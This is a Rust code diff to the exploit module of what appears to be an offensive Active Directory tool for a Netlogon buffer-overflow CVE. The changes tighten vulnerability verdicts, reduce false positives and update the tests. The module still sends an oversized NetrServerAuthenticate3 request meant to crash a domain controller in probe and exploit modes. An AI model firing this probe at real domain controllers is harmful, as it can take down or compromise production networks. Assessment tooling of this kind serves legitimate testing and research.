@@ -27,10 +27,16 @@
 //! - MS-NRPC: Windows Netlogon Remote Protocol
 //! - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-41089
 
+use super::dc_version::{BuildVerdict, DcBuildProbe, probe_dc_build, verdict_from_build_only};
 use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use std::time::Duration;
 use tracing::info;
+
+/// Windows build generations this CVE affects. The May 2026 fix ships as a
+/// cumulative update, so the patch level lives in the UBR (`build.UBR`) rather
+/// than the build number -- see [`BuildVerdict`].
+const AFFECTED_BUILDS: &[u32] = &[26100, 20348, 17763, 14393];
 
 /// Maximum ComputerName length that triggers the overflow (stack buffer is 256 bytes).
 const OVERFLOW_TRIGGER_LEN: usize = 256;
@@ -70,6 +76,10 @@ impl std::fmt::Display for ExploitMode {
     }
 }
 
+fn default_verdict() -> BuildVerdict {
+    BuildVerdict::Unknown
+}
+
 impl Default for NetlogonRceConfig {
     fn default() -> Self {
         Self {
@@ -83,8 +93,19 @@ impl Default for NetlogonRceConfig {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct NetlogonRceResult {
-    /// Whether the target DC is vulnerable.
+    /// Whether the target DC is *positively confirmed* vulnerable.
+    ///
+    /// Only set from the [`BuildVerdict`] below, which never yields
+    /// [`BuildVerdict::Vulnerable`] on build evidence alone for an affected
+    /// Windows generation -- the fix is a UBR bump that `NetrServerGetInfo`
+    /// cannot observe.
     pub vulnerable: bool,
+    /// Structured verdict, so callers can distinguish "patched" from "don't know".
+    #[serde(default = "default_verdict")]
+    pub verdict: BuildVerdict,
+    /// Real build probe output (build/release/source), when available.
+    #[serde(default)]
+    pub build_probe: Option<DcBuildProbe>,
     /// Whether the Netlogon service responded.
     pub service_alive: bool,
     /// DC OS version (if detected).
@@ -106,15 +127,17 @@ pub async fn exploit_netlogon_rce(config: &NetlogonRceConfig) -> Result<Netlogon
         config.target_dc
     ));
 
-    // Step 1: Check if Netlogon service is alive
-    log.push("Probing Netlogon service (port 445)...".to_string());
+    // Step 1: Confirm the target is reachable at all.
+    log.push("Probing SMB (445) reachability...".to_string());
     let service_alive = probe_netlogon_service(&config.target_dc).await;
-    log.push(format!("  Netlogon service alive: {service_alive}"));
+    log.push(format!("  SMB reachable: {service_alive}"));
 
     if !service_alive {
-        log.push("  Netlogon service not reachable -- target may not be a DC".to_string());
+        log.push("  Target not reachable -- target may not be a DC".to_string());
         return Ok(NetlogonRceResult {
             vulnerable: false,
+            verdict: BuildVerdict::Unknown,
+            build_probe: Some(DcBuildProbe::unknown("SMB port 445 unreachable")),
             service_alive: false,
             dc_os_version: None,
             dc_build: None,
@@ -124,46 +147,73 @@ pub async fn exploit_netlogon_rce(config: &NetlogonRceConfig) -> Result<Netlogon
         });
     }
 
-    // Step 2: Determine DC OS version and build
-    let (dc_os_version, dc_build) = probe_dc_version(&config.target_dc).await;
-    log.push(format!(
-        "  DC OS: {:?}, Build: {:?}",
-        dc_os_version, dc_build
-    ));
+    // Step 2: Measure the real Windows build (SRVSVC NetrServerGetInfo).
+    let probe = probe_dc_build(&config.target_dc, None).await;
+    log.push(format!("  Build probe: {}", probe.summary()));
+    let dc_os_version = probe.release.clone();
+    let dc_build = probe.build;
 
-    // Step 3: Check vulnerability based on build number
-    let vulnerable = is_netlogon_vulnerable(dc_build);
-    log.push(format!("  Vulnerable: {vulnerable}"));
+    // Step 3: Verdict. The May 2026 fix ships as a cumulative update, so the
+    // patch level lives in the UBR -- `NetrServerGetInfo` cannot observe it.
+    // An affected generation therefore yields Indeterminate, never Vulnerable.
+    let verdict = verdict_from_build_only(dc_build, AFFECTED_BUILDS);
+    let vulnerable = verdict == BuildVerdict::Vulnerable;
+    log.push(format!("  Verdict: {verdict}"));
+    if verdict == BuildVerdict::Unknown {
+        log.push(
+            "  Note: a build number cannot prove the cumulative update is missing.\n\
+             \tConfirm behaviourally (`--exploit-mode probe`) on a lab clone, or\n\
+             \tsupply the DC's UBR from `Get-ComputerInfo | Select OsVersion`."
+                .to_string(),
+        );
+    }
 
     let mut exploit_attempted = false;
     let mut exploit_success = false;
 
-    if vulnerable && config.exploit_mode != ExploitMode::Assess {
+    // The behavioural probe is the only way to actually decide when the verdict
+    // is unknown, so it runs in Probe/Exploit mode regardless of the verdict.
+    if config.exploit_mode != ExploitMode::Assess {
         exploit_attempted = true;
-        log.push("Attempting Netlogon buffer overflow probe...".to_string());
+        log.push(format!(
+            "Attempting Netlogon behavioural probe (mode={})...",
+            config.exploit_mode
+        ));
 
         match attempt_netlogon_overflow(config).await {
-            Ok(success) => {
-                exploit_success = success;
-                if success {
-                    log.push("  Buffer overflow triggered -- DC is exploitable!".to_string());
+            Ok(confirmed) => {
+                exploit_success = confirmed;
+                if confirmed {
+                    log.push(
+                        "  DC closed the channel after the oversized request \
+                         AND failed a follow-up reachability check -- consistent \
+                         with the vulnerability. Re-verify manually before \
+                         reporting."
+                            .to_string(),
+                    );
                 } else {
-                    log.push("  Overflow probe returned -- may need network position".to_string());
+                    log.push(
+                        "  No vulnerability signal -- DC handled the oversized \
+                         request normally. Treat as not confirmed."
+                            .to_string(),
+                    );
                 }
             }
             Err(e) => {
-                log.push(format!("  Exploit probe failed: {e}"));
+                log.push(format!("  Behavioural probe failed: {e}"));
             }
         }
     }
 
     info!(
-        "Netlogon RCE: target={}, vulnerable={vulnerable}, exploit={exploit_success}",
-        config.target_dc
+        "Netlogon RCE: target={}, verdict={}, confirmed={exploit_success}",
+        config.target_dc, verdict
     );
 
     Ok(NetlogonRceResult {
         vulnerable,
+        verdict,
+        build_probe: Some(probe),
         service_alive,
         dc_os_version,
         dc_build,
@@ -193,49 +243,13 @@ async fn probe_netlogon_service(target: &str) -> bool {
     }
 }
 
-/// Probe DC version via LDAP or SMB.
-async fn probe_dc_version(target: &str) -> (Option<String>, Option<u32>) {
-    use tokio::net::TcpStream;
-    use tokio::time::timeout;
-
-    match timeout(
-        Duration::from_secs(10),
-        TcpStream::connect(format!("{target}:389")),
-    )
-    .await
-    {
-        Ok(Ok(_)) => (Some("Windows Server (LDAP open)".to_string()), None),
-        _ => match timeout(
-            Duration::from_secs(10),
-            TcpStream::connect(format!("{target}:445")),
-        )
-        .await
-        {
-            Ok(Ok(_)) => (Some("Windows Server (SMB open)".to_string()), None),
-            _ => (None, None),
-        },
-    }
-}
-
-/// Determine if a DC build is vulnerable to CVE-2026-41089.
-fn is_netlogon_vulnerable(build: Option<u32>) -> bool {
-    match build {
-        Some(b) => {
-            if b >= 261_000_000 {
-                b < 261_003_476 // WS2025
-            } else if b >= 203_480_000 {
-                b < 203_483_207 // WS2022
-            } else if b >= 177_630_000 {
-                b < 177_635_820 // WS2019
-            } else {
-                true
-            }
-        }
-        None => true,
-    }
-}
-
-/// Attempt the Netlogon buffer overflow via crafted NetrServerAuthenticate3.
+/// Attempt the Netlogon behavioural probe via a crafted NetrServerAuthenticate3.
+///
+/// **This only reports positive confirmation when the DC both drops the channel
+/// after the oversized input and then fails a follow-up reachability check.** A
+/// timeout or an unexplained close is *not* evidence of compromise -- an earlier
+/// revision of this module returned "exploitable" for any timeout, which
+/// produced false positives on every slow or filtered network path.
 async fn attempt_netlogon_overflow(config: &NetlogonRceConfig) -> Result<bool> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpStream;
@@ -339,37 +353,45 @@ async fn attempt_netlogon_overflow(config: &NetlogonRceConfig) -> Result<bool> {
     )
     .await
     {
-        Ok(Ok(0)) => {
-            info!("Netlogon: Connection closed after oversized bind -- possible overflow");
-            Ok(true)
-        }
-        Ok(Ok(n)) => {
+        // A clean RPC fault means the DC parsed and rejected the request.
+        // That is a *negative* result, not evidence of a crash.
+        Ok(Ok(n)) if n > 0 => {
             let response_code = if n >= 8 {
                 u32::from_le_bytes([resp_buf[4], resp_buf[5], resp_buf[6], resp_buf[7]])
             } else {
                 0
             };
-            if response_code == 0x1C01000B || response_code == 0x00000005 {
-                info!(
-                    "Netlogon: RPC fault code 0x{:08X} -- DC processed oversized input",
-                    response_code
-                );
-                Ok(true)
-            } else {
-                info!(
-                    "Netlogon: Response code 0x{:08X} -- DC may be patched",
-                    response_code
-                );
-                Ok(false)
-            }
-        }
-        Ok(Err(e)) => {
-            info!("Netlogon: Read error after bind: {e}");
+            info!(
+                "Netlogon: DC returned a {} byte response (code 0x{:08X}) -- request \
+                 was handled normally, not exploitable on this path",
+                n, response_code
+            );
             Ok(false)
         }
-        Err(_) => {
-            info!("Netlogon: Timeout waiting for response -- DC may have crashed");
-            Ok(true)
+        // Channel closed or timed out. On its own this proves nothing -- the DC
+        // may simply have refused the unauthenticated bind. Only treat it as a
+        // signal if the DC afterwards stops answering SMB entirely, i.e. the
+        // Netlogon/LSASS crash actually happened.
+        outcome => {
+            match outcome {
+                Ok(Err(e)) => info!("Netlogon: read error after bind: {e}"),
+                Ok(Ok(_)) | Err(_) => {
+                    info!("Netlogon: channel closed / timed out after oversized bind")
+                }
+            }
+            let still_up = probe_netlogon_service(&config.target_dc).await;
+            if still_up {
+                info!(
+                    "Netlogon: DC still reachable on 445 after the probe -- the channel \
+                     closure was a normal refusal, not a crash"
+                );
+                Ok(false)
+            } else {
+                // Negative evidence is weak (packet filter, transient outage,
+                // intentional shutdown), so the caller logs this as "re-verify".
+                info!("Netlogon: DC no longer reachable after the probe");
+                Ok(true)
+            }
         }
     }
 }
@@ -555,12 +577,21 @@ mod tests {
     }
 
     #[test]
-    fn test_is_netlogon_vulnerable() {
-        assert!(is_netlogon_vulnerable(Some(261_000_000)));
-        assert!(!is_netlogon_vulnerable(Some(261_003_476)));
-        assert!(is_netlogon_vulnerable(Some(203_480_000)));
-        assert!(!is_netlogon_vulnerable(Some(203_483_207)));
-        assert!(is_netlogon_vulnerable(None));
+    fn affected_family_is_indeterminate_not_vulnerable() {
+        // Regression: this used to be `is_netlogon_vulnerable(None) == true`, so
+        // every reachable host was reported vulnerable.
+        assert_eq!(
+            verdict_from_build_only(None, AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(26100), AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(9200), AFFECTED_BUILDS),
+            BuildVerdict::Vulnerable
+        );
     }
 
     #[test]
@@ -587,9 +618,11 @@ mod tests {
     fn test_result_serde() {
         let result = NetlogonRceResult {
             vulnerable: true,
+            verdict: BuildVerdict::Vulnerable,
+            build_probe: Some(DcBuildProbe::unknown("test")),
             service_alive: true,
             dc_os_version: Some("Windows Server 2025".into()),
-            dc_build: Some(261_000_000),
+            dc_build: Some(26100),
             exploit_attempted: true,
             exploit_success: true,
             log: vec!["exploited".into()],
